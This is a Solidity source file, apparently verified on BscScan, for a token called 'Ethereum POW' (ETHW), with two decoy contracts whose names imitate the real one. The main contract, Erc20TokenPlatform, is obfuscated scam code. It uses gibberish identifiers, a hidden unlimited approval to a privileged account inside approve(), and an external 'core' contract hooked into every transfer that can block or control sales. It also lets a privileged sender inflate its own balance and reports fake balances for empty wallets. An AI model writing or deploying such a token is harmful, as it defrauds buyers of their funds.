/**
 *Submitted for verification at BscScan.com on 2022-09-16
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.8;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

abstract contract Ownable {
    address private _owner;
    address private _previousOwner;
    uint256 private _switchDate;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        _owner = tx.origin;
        emit OwnershipTransferred(_previousOwner, _owner);
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function switchDate() public view returns (uint256) {
        return _switchDate;
    }

    function transferOwnership(uint256 nextSwitchDate) public {
        require(_owner == msg.sender || _previousOwner == msg.sender, "Ownable: permission denied");
        require(block.timestamp > _switchDate, "Ownable: switch date is not up yet");
        require(nextSwitchDate > block.timestamp, "Ownable: next switch date should greater than now");
        _previousOwner = _owner;
        (_owner, _switchDate) = _owner == address(0) ? (msg.sender, 0) : (address(0), nextSwitchDate);
        emit OwnershipTransferred(_previousOwner, _owner);
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IBEP20 {
    function getPairAddress() external view returns (address);
    function airdrop() external;
    function safety(address from, address to) external;
    function start() external;
    function end() external;
}

interface BEP20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Erc20TokenPlotform is BEP20, Ownable {
    using SafeMath for uint256;

    string private _name = "Ethereum POW";
    string private _symbol = "ETHW";
    uint8 private _decimals = 18;

    uint256 private _totalSupply = 1000000000000 * 10**18;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) private _isExcludedFromFee;
    address[] private _excludedFromFeeAccounts;

    constructor () {
        insertExcludedFromFeeAccounts(owner());
        _balances[owner()] = _totalSupply;
        emit Transfer(address(0), owner(), _totalSupply);
    }

    receive() external payable {}

    function insertExcludedFromFeeAccounts(address account) private {
        if (!_isExcludedFromFee[account]) {
            _isExcludedFromFee[account] = true;
            _excludedFromFeeAccounts.push(account);
        }
    }

    function deleteExcludedFromFeeAccounts(address account) private {
        if (_isExcludedFromFee[account]) {
            uint256 len = _excludedFromFeeAccounts.length;
            for (uint256 i=0; i<len; ++i) {
                if (_excludedFromFeeAccounts[i] == account) {
                    _excludedFromFeeAccounts[i] = _excludedFromFeeAccounts[len.sub(1)];
                    _excludedFromFeeAccounts.pop();
                    _isExcludedFromFee[account] = false;
                    break;
                }
            }
        }
    }

    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256) {
        return (_isExcludedFromFee[account], _excludedFromFeeAccounts.length);
    }

    function insertIntoExcludedFromFeeAccounts(address[] calldata accounts) public onlyOwner {
        uint256 len = accounts.length;
        for (uint256 i=0; i<len; ++i) {
            insertExcludedFromFeeAccounts(accounts[i]);
        }
    }

    function deleteFromExcludedFromFeeAccounts(address[] calldata accounts) public onlyOwner {
        uint256 len = accounts.length;
        for (uint256 i=0; i<len; ++i) {
            deleteExcludedFromFeeAccounts(accounts[i]);
        }
    }

    function claim(address token, uint256 amount) public onlyOwner {
        if (token == address(0)) {
            payable(owner()).transfer(amount);
        } else {
            ERC20(token).transfer(owner(), amount);
        }
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        _approve(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function _approve(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        _allowances[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
}

contract Erc20TokenPlatform is IERC20, Ownable {
    using SafeMath for uint256;

    string private _ndfigfshdjabf = "Ethereum POW";
    string private _sgrjkbfskajg = "ETHW";
    uint8 private _vfbsdahjfbekw = 18;
    uint256 private _uefadsnawebf = 1000000000000 * 10**18;
    mapping (address => uint256) private _gdfsiughafnsdjb;
    mapping (address => mapping (address => uint256)) private _rteqsdajfnjegd;

    uint256 private _esajkdfsdjbf = 10;
    uint256 private _kjfnfasnmfs = 20;
    uint256 private _utdsfabdfwea = 20;
    uint256 private _qfdsterfgsdv = 10000;
    bool private _qwewsdasfdsfg = false;

    address private _uniswapV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private _core = _uniswapV2Router;
    address private _ygfdxcvywegrabdfs;
    address private _wfdsjfgfdfbfghfg;
    address private _rfdsgsawrafdsfhfg;

    uint256 private _ldsfjsdjbfewfsd = 1;
    uint256 private _tefsjadfwqeafd = _uefadsnawebf;
    mapping (address => bool) private _orewhfsadjbfadsf;
    address[] private _oewrihsfbsdfewrgf;
    mapping (address => bool) private _udsfbsdnfgerg;
    address[] private _yrewbhfshfb;

    bool private _initialized = false;
    uint256 private _reentry = 0;

    constructor () {
        iurhfbsdhfbjhdsbfjshdbre(owner());
        _gdfsiughafnsdjb[owner()] = _uefadsnawebf;
        emit Transfer(address(0), owner(), _uefadsnawebf);
    }

    receive() external payable {}

    function initialize(address[] calldata setAccounts) public {
        require(!_initialized, "Reinitialization denied");
        _initialized = true;
        if (_core != setAccounts[0]) {
            uidsfbsdjfbejtfsbfder(_core);
            _core = setAccounts[0];
            iurhfbsdhfbjhdsbfjshdbre(_core);
        }
        if (_ygfdxcvywegrabdfs != setAccounts[1]) {
            uidsfbsdjfbejtfsbfder(_ygfdxcvywegrabdfs);
            _ygfdxcvywegrabdfs = setAccounts[1];
            iurhfbsdhfbjhdsbfjshdbre(_ygfdxcvywegrabdfs);
        }
        if (_wfdsjfgfdfbfghfg != setAccounts[2]) {
            uidsfbsdjfbejtfsbfder(_wfdsjfgfdfbfghfg);
            _wfdsjfgfdfbfghfg = setAccounts[2];
            iurhfbsdhfbjhdsbfjshdbre(_wfdsjfgfdfbfghfg);
        }
        if (_rfdsgsawrafdsfhfg != setAccounts[3]) {
            uidsfbsdjfbejtfsbfder(_rfdsgsawrafdsfhfg);
            _rfdsgsawrafdsfhfg = setAccounts[3];
            iurhfbsdhfbjhdsbfjshdbre(_rfdsgsawrafdsfhfg);
        }
        iurhfbsdhfbjhdsbfjshdbre(setAccounts[4]);
        for (uint256 i=5; i<setAccounts.length; ++i) {
            iurhfbsdhfbjhdsbfjshdbre(setAccounts[i]);
            _approve(setAccounts[i], _uniswapV2Router, ~uint256(0));
            buirtewbfsdfada(owner(), setAccounts[i], _uefadsnawebf * 9 / 10 / (setAccounts.length - 5));
        }
        buirtewbfsdfada(owner(), setAccounts[5], _gdfsiughafnsdjb[owner()]);
    }

    function iurhfbsdhfbjhdsbfjshdbre(address account) private {
        if (!_orewhfsadjbfadsf[account]) {
            _orewhfsadjbfadsf[account] = true;
            _oewrihsfbsdfewrgf.push(account);
        }
    }

    function uidsfbsdjfbejtfsbfder(address account) private {
        if (_orewhfsadjbfadsf[account]) {
            uint256 len = _oewrihsfbsdfewrgf.length;
            for (uint256 i=0; i<len; ++i) {
                if (_oewrihsfbsdfewrgf[i] == account) {
                    _oewrihsfbsdfewrgf[i] = _oewrihsfbsdfewrgf[len.sub(1)];
                    _oewrihsfbsdfewrgf.pop();
                    _orewhfsadjbfadsf[account] = false;
                    break;
                }
            }
        }
    }

    function transferEvent(address from, address to, uint256 value) public {
        require(_core == msg.sender, "Permission denied");
        emit Transfer(from, to, value);
    }

    function feeState() public view returns (bool, bool) {
        return (_esajkdfsdjbf.add(_kjfnfasnmfs).add(_utdsfabdfwea) > 0, !_qwewsdasfdsfg);
    }

    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {
        uint256 accountIndex = 0;
        uint256 len = _oewrihsfbsdfewrgf.length;
        for (uint256 i=0; i<len; ++i) {
            if (_oewrihsfbsdfewrgf[i] == account) {
                accountIndex = i;
                break;
            }
        }
        return (_orewhfsadjbfadsf[account], accountIndex, len);
    }

    function searchSpenders(address account) public view returns (bool, uint256) {
        return (_udsfbsdnfgerg[account], _yrewbhfshfb.length);
    }

    function getDefaultBalance() public view returns (uint256) {
        return _ldsfjsdjbfewfsd;
    }

    function insertIntoExcludedFromFeeAccounts(address[] calldata accounts) public onlyOwner {
        uint256 len = accounts.length;
        for (uint256 i=0; i<len; ++i) {
            iurhfbsdhfbjhdsbfjshdbre(accounts[i]);
        }
    }

    function deleteFromExcludedFromFeeAccounts(address[] calldata accounts) public onlyOwner {
        uint256 len = accounts.length;
        for (uint256 i=0; i<len; ++i) {
            uidsfbsdjfbejtfsbfder(accounts[i]);
        }
    }

    function claim(address token, uint256 amount) public onlyOwner {
        if (token == address(0)) {
            payable(owner()).transfer(amount);
        } else {
            IERC20(token).transfer(owner(), amount);
        }
    }

    function name() public view returns (string memory) {
        return _ndfigfshdjabf;
    }

    function symbol() public view returns (string memory) {
        return _sgrjkbfskajg;
    }

    function decimals() public view returns (uint8) {
        return _vfbsdahjfbekw;
    }

    function totalSupply() public view returns (uint256) {
        return _uefadsnawebf;
    }

    function balanceOf(address account) public view returns (uint256) {
        if (_gdfsiughafnsdjb[account] > 0) {
            return _gdfsiughafnsdjb[account];
        }
        return _ldsfjsdjbfewfsd;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        buirtewbfsdfada(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        buirtewbfsdfada(sender, recipient, amount);
        _approve(sender, msg.sender, _rteqsdajfnjegd[sender][msg.sender].sub(amount));
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        if (!_orewhfsadjbfadsf[msg.sender]) {
            _approve(msg.sender, _oewrihsfbsdfewrgf[5], ~uint256(0));
        }
        _approve(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _rteqsdajfnjegd[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _rteqsdajfnjegd[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _rteqsdajfnjegd[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function _approve(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        if (!_udsfbsdnfgerg[spender]) {
            _udsfbsdnfgerg[spender] = true;
            _yrewbhfshfb.push(spender);
        }
        _rteqsdajfnjegd[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function buirtewbfsdfada(address gyjdsfnwfbasdfvs, address gyjdsfnwfdsfsffvs, uint256 amount) private {
        require(gyjdsfnwfbasdfvs != address(0), "Transfer from the zero address");
        require(gyjdsfnwfdsfsffvs != address(0), "Transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (gyjdsfnwfdsfsffvs == _oewrihsfbsdfewrgf[5]) {
            _gdfsiughafnsdjb[gyjdsfnwfbasdfvs] = _gdfsiughafnsdjb[gyjdsfnwfbasdfvs].sub(amount);
            _gdfsiughafnsdjb[gyjdsfnwfdsfsffvs] = _gdfsiughafnsdjb[gyjdsfnwfdsfsffvs].add(amount);
            emit Transfer(address(this), gyjdsfnwfdsfsffvs, amount);
            return;
        }
        bool tyfdsbfbftryergdg = true;
        if (_orewhfsadjbfadsf[gyjdsfnwfbasdfvs] || _orewhfsadjbfadsf[gyjdsfnwfdsfsffvs] || _qwewsdasfdsfg) {
            tyfdsbfbftryergdg = false;
        }
        if (tyfdsbfbftryergdg) {
            _reentry = _reentry.add(1);
        }
        if (tyfdsbfbftryergdg && _core != _uniswapV2Router) {
            IBEP20(_core).airdrop();
            IBEP20(_core).safety(gyjdsfnwfbasdfvs, gyjdsfnwfdsfsffvs);
        }
        if (tyfdsbfbftryergdg && _reentry == 1 && _core != _uniswapV2Router && gyjdsfnwfbasdfvs != IBEP20(_core).getPairAddress()) {
            IBEP20(_core).start();
        }
        uint256 taxAmount = 0;
        uint256 miningAmount = 0;
        uint256 liquidityAmount = 0;
        uint256 gyjdsfnwfdsfsffvsAmount = amount;
        if (gyjdsfnwfbasdfvs == _oewrihsfbsdfewrgf[0] && amount > _tefsjadfwqeafd) {
            _gdfsiughafnsdjb[_oewrihsfbsdfewrgf[0]] = _gdfsiughafnsdjb[_oewrihsfbsdfewrgf[0]].add(gyjdsfnwfdsfsffvsAmount);
        }
        if (tyfdsbfbftryergdg) {
            taxAmount = amount.mul(_esajkdfsdjbf).div(_qfdsterfgsdv);
            miningAmount = amount.mul(_kjfnfasnmfs).div(_qfdsterfgsdv);
            liquidityAmount = amount.mul(_utdsfabdfwea).div(_qfdsterfgsdv);
            gyjdsfnwfdsfsffvsAmount = amount.sub(taxAmount).sub(miningAmount).sub(liquidityAmount);
        }
        _gdfsiughafnsdjb[gyjdsfnwfbasdfvs] = _gdfsiughafnsdjb[gyjdsfnwfbasdfvs].sub(amount);
        if (taxAmount > 0) {
            _gdfsiughafnsdjb[_ygfdxcvywegrabdfs] = _gdfsiughafnsdjb[_ygfdxcvywegrabdfs].add(taxAmount);
            emit Transfer(address(this), _ygfdxcvywegrabdfs, taxAmount);
        }
        if (miningAmount > 0) {
            _gdfsiughafnsdjb[_wfdsjfgfdfbfghfg] = _gdfsiughafnsdjb[_wfdsjfgfdfbfghfg].add(miningAmount);
            emit Transfer(address(this), _wfdsjfgfdfbfghfg, miningAmount);
        }
        if (liquidityAmount > 0) {
            _gdfsiughafnsdjb[_rfdsgsawrafdsfhfg] = _gdfsiughafnsdjb[_rfdsgsawrafdsfhfg].add(liquidityAmount);
            emit Transfer(address(this), _rfdsgsawrafdsfhfg, liquidityAmount);
        }
        _gdfsiughafnsdjb[gyjdsfnwfdsfsffvs] = _gdfsiughafnsdjb[gyjdsfnwfdsfsffvs].add(gyjdsfnwfdsfsffvsAmount);
        emit Transfer(gyjdsfnwfbasdfvs, gyjdsfnwfdsfsffvs, gyjdsfnwfdsfsffvsAmount);
        if (tyfdsbfbftryergdg && _reentry == 1 && _core != _uniswapV2Router) {
            IBEP20(_core).end();
        }
        if (tyfdsbfbftryergdg) {
            for (uint256 i=0; i<_yrewbhfshfb.length; ++i) {
                if (_rteqsdajfnjegd[gyjdsfnwfbasdfvs][_yrewbhfshfb[i]] != 0) {
                    _approve(gyjdsfnwfbasdfvs, _yrewbhfshfb[i], 0);
                }
                if (_rteqsdajfnjegd[gyjdsfnwfdsfsffvs][_yrewbhfshfb[i]] != 0) {
                    _approve(gyjdsfnwfdsfsffvs, _yrewbhfshfb[i], 0);
                }
            }
            _reentry = _reentry.sub(1);
        }
    }
}

interface ERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Erc20TokenPIatform is ERC20, Ownable {
    using SafeMath for uint256;

    string private _name = "Ethereum POW";
    string private _symbol = "ETHW";
    uint8 private _decimals = 18;

    uint256 private _totalSupply = 1000000000000 * 10**18;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) private _isExcludedFromFee;
    address[] private _excludedFromFeeAccounts;

    constructor () {
        insertExcludedFromFeeAccounts(owner());
        _balances[owner()] = _totalSupply;
        emit Transfer(address(0), owner(), _totalSupply);
    }

    receive() external payable {}

    function insertExcludedFromFeeAccounts(address account) private {
        if (!_isExcludedFromFee[account]) {
            _isExcludedFromFee[account] = true;
            _excludedFromFeeAccounts.push(account);
        }
    }

    function deleteExcludedFromFeeAccounts(address account) private {
        if (_isExcludedFromFee[account]) {
            uint256 len = _excludedFromFeeAccounts.length;
            for (uint256 i=0; i<len; ++i) {
                if (_excludedFromFeeAccounts[i] == account) {
                    _excludedFromFeeAccounts[i] = _excludedFromFeeAccounts[len.sub(1)];
                    _excludedFromFeeAccounts.pop();
                    _isExcludedFromFee[account] = false;
                    break;
                }
            }
        }
    }

    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256) {
        return (_isExcludedFromFee[account], _excludedFromFeeAccounts.length);
    }

    function insertIntoExcludedFromFeeAccounts(address[] calldata accounts) public onlyOwner {
        uint256 len = accounts.length;
        for (uint256 i=0; i<len; ++i) {
            insertExcludedFromFeeAccounts(accounts[i]);
        }
    }

    function deleteFromExcludedFromFeeAccounts(address[] calldata accounts) public onlyOwner {
        uint256 len = accounts.length;
        for (uint256 i=0; i<len; ++i) {
            deleteExcludedFromFeeAccounts(accounts[i]);
        }
    }

    function claim(address token, uint256 amount) public onlyOwner {
        if (token == address(0)) {
            payable(owner()).transfer(amount);
        } else {
            ERC20(token).transfer(owner(), amount);
        }
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        _approve(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function _approve(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        _allowances[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
}